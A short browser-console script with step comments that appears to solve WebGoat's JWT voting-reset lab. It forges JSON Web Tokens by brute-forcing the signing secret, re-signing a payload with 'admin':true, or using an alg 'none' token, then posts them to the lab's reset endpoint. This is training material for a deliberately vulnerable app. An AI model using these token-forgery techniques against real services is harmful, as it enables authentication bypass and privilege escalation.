// Copy and paste this into Browser Console (F12 > Console)

// ═══════════════════════════════════════════════════════════════
// STEP 1: Get your current fresh token
// ═══════════════════════════════════════════════════════════════
// F12 > Application > Cookies > Find "access_token" > Copy value

// ═══════════════════════════════════════════════════════════════
// STEP 2: Use PowerShell to create proper token
// ═══════════════════════════════════════════════════════════════
// PowerShell > Type 8 (brute force) > Paste token > Find secret
// PowerShell > Type 9 (sign) > Payload + Secret

// ═══════════════════════════════════════════════════════════════
// STEP 3: Test your new token with this command
// ═══════════════════════════════════════════════════════════════

// Replace YOUR_TOKEN_HERE with the token from PowerShell
const myToken = 'YOUR_TOKEN_HERE';

// Test if it works
fetch('http://192.168.254.112:8001/WebGoat/JWT/votings/reset', {
  method: 'POST',
  headers: {
    'Authorization': 'Bearer ' + myToken,
    'Content-Type': 'application/json'
  }
})
.then(response => {
  console.log('Status:', response.status);
  return response.json();
})
.then(data => {
  console.log('Response:', data);
  if (data.lessonCompleted || data.success) {
    console.log('✅ SUCCESS! Challenge complete!');
  } else if (data.feedback) {
    console.log('📝 Feedback:', data.feedback);
  }
})
.catch(error => {
  console.log('❌ Error:', error);
});

// ═══════════════════════════════════════════════════════════════
// ALTERNATIVE: If secret is "webgoat", use this pre-signed token
// ═══════════════════════════════════════════════════════════════
// Get fresh token, decode it to get current "iat" timestamp
// Then use PowerShell Option 9 with:
// Payload: {"iat":1766560664,"admin":true,"user":"Tom"}
// Secret: webgoat

// ═══════════════════════════════════════════════════════════════
// QUICK TEST: Algorithm "none" approach
// ═══════════════════════════════════════════════════════════════
// If PowerShell Option 6 gave you a token ending with "."
// Use it like this:

const noneToken = 'eyJhbGci...payload...';  // Token ending with .

fetch('http://192.168.254.112:8001/WebGoat/JWT/votings/reset', {
  method: 'POST',
  headers: {
    'Authorization': 'Bearer ' + noneToken
  }
})
.then(r => r.json())
.then(console.log);
